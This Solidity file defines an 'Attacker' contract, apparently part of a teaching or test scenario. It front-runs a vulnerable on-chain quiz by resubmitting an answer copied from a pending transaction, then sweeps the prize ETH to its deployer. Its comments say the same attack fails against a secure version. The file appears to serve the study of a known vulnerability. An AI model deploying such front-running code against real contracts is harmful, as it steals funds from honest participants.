// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IQuiz} from "./IQuiz.sol";

/**
 * @title Attacker
 * @notice Front-running bot for scenario S6.
 * @dev Watches the mempool, copies the answer out of a pending
 *      {VulnerableQuiz-submitAnswer} transaction, and resubmits it first so the
 *      prize is paid to this contract instead of the honest solver. Against
 *      {SecureQuiz} the answer never appears in the clear and plaintext
 *      submission is disabled, so {attack} reverts.
 */
contract Attacker {
    /// @notice Quiz being front-run.
    IQuiz public immutable quiz;

    /// @notice Deployer, which receives swept proceeds.
    address payable public immutable owner;

    error ZeroTarget();
    error SweepFailed();

    /**
     * @param target quiz to front-run
     */
    constructor(address target) {
        if (target == address(0)) {
            revert ZeroTarget();
        }
        quiz = IQuiz(target);
        owner = payable(msg.sender);
    }

    /**
     * @notice Submit the answer copied from a pending honest transaction.
     * @param answer the victim's answer, observed in the mempool
     */
    function attack(string calldata answer) external {
        quiz.submitAnswer(answer);
    }

    /**
     * @notice Prize claimed so far, i.e. this contract's ETH balance.
     */
    function profit() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Move the accumulated prize out of this contract.
     * @return amount ETH sent to {owner}
     */
    function sweep() external returns (uint256 amount) {
        amount = address(this).balance;
        (bool ok,) = owner.call{value: amount}("");
        if (!ok) {
            revert SweepFailed();
        }
    }

    receive() external payable {}
}
